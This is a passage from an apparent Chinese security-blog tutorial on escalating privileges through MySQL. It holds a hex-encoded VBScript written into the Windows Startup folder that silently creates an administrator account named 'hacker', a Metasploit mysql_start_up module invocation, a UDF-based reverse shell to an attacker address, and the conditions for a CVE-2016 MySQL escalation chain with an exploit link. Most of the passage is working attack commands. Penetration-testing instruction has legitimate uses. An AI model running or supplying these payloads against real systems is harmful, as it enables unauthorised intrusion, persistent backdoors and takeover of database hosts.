0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A  into dumpfile
'C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\3.vbs';
#win2008启动项路径：
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l22Ca1YWUsD7WAzy1ogswjjZOU3LDqapv0iaAeXYTfN96NkiaxO4gFiaVvQ/640?wx_fmt=png)

### 2.2 msf 启动项提权

```
use exploit/windows/mysql/mysql_start_up
set password root
set username root
set rhosts 192.168.0.107 
run
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2J8jTxjicbk0g7wQgqtIvuG08dtUHJib5gm9uxdfG5xqeVU68yxFvOEug/640?wx_fmt=png)

### 3. 反弹端口提权

和上边相同的方式上传 dll 文件 dll

```
CREATE FUNCTION backshell RETURNS STRING SONAME 'udf.dll';
select backshell("192.168.0.105", 3333);
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rf8EhNshONRSqskWvicsnphA3hwx5ic5l2eGJnWIVsXXMsAuCriazYHhmJ3Oxzh9o48JtT5R5dWCeFvPIE7cZaic7Q/640?wx_fmt=png)

4.CVE-2016-6663 提权

CVE-2016-6662、CVE-2016-6663、CVE-2016-6664 提权漏洞，影响了 Mysql 小于 5.5.51 或小于 5.6.32 或小于 5.7.14 及衍生版本。

6636 利用条件：

*   getshell 获得 www-data 权限
    
*   获取到一个拥有 create,insert,select 低权限账户
    
*   提权过程需要在交互式的 shell 环境中运行，需要反弹 shell 再提权
    
*   MySQL 版本需要 <=5.5.51 或 5.6.x <=5.6.32 或 5.7.x <=5.7.14 或 8.x < 8.0.1
    
*   MariaDB 版本需要 <= 5.5.51 或 10.0.x <= 10.0.27 或 10.1.x <= 10.1.17
    

CVE-2016-6663 可以将 www-data 权限提升为 mysql 权限，使用 6664 再将 mysql 权限提升为 root 权限。复现未成功，有时间在尝试。

exp:

https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html

参考链接：

https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31

https://www.freebuf.com/articles/network/261917.html

https://xz.aliyun.com/t/1122

https://blog.csdn.net/qq_34640691/article/details/116010014  

* * *

**推 荐 阅 读**

  

  

  

  

_**往期重点  
**_

  

  

▶[11 种绕过 CDN 查找真实 IP 方法](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247488351&idx=1&sn=0b0dc498ed9e7d289f5da464b47afdb7&chksm=ce67b9c6f91030d0ad9f0e6e1f26ea15db4cb86cae014707ce206d6be770ebbe8cc38c6395a5&scene=21#wechat_redirect)

[▶](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247487013&idx=1&sn=70934514d004ef18964de5666ac6ea6c&chksm=ce67a4bcf9102daa619be85f5953ddf6e36ee4a08ecbfc97306ca218d61b4adcfaa0701d0fab&scene=21#wechat_redirect)[【内网渗透系列】- 获取 windows hash 的几种方式（文中附工具下载链接）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247488090&idx=1&sn=c9b686f6a365aca569b55c65523971c9&chksm=ce67b8c3f91031d508874778d249ae08623d10acfb8936e3c5b3cf89dc30b47c0f51e1cebb35&scene=21#wechat_redirect)

如侵权请私聊公众号删文![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONTvOgibsqTqhpcudOIEgtjegD0FLhic60DDdlKIdP7WMfU7A6Mm8skDxVvPYqywpqGz19NnBPe0fntQ/640?wx_fmt=jpeg)

**长按 - 识别 - 关注**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rf8EhNshONS90mIWUoAlBic1thyCTOicHBxVVPJ75VEdQ1bxkakAnfoT20QcIREpFUUaRD1lFZojBTEUicYL11s7Q/640?wx_fmt=jpeg)

**Hacking 黑白红**

一个专注 Hacking 技术的学习平台

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBDEU5hJAFfap4mBBAnI4BIic2GAuYgDwUzqwIb9wicGiaCyopAyJEKapgA/640?wx_fmt=gif)

**点分享**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBRJ4tRlk9QKMxMAMticVia5ia8bcewCtM3W67zSrFPyjHuSKmeESESE1Ig/640?wx_fmt=gif)

**点收藏**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBnTO2pb7hEqNd7bAykePEibP0Xw7mJTJ7JnFkHuQR9vHE7tNJyHIibodA/640?wx_fmt=gif)

**点点赞**

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBhibuWXia5pNqBfUReATI6GO6sYibzMvj8ibQM6rOo2ULshCrbaM0mJYEqw/640?wx_fmt=gif)

**点在看**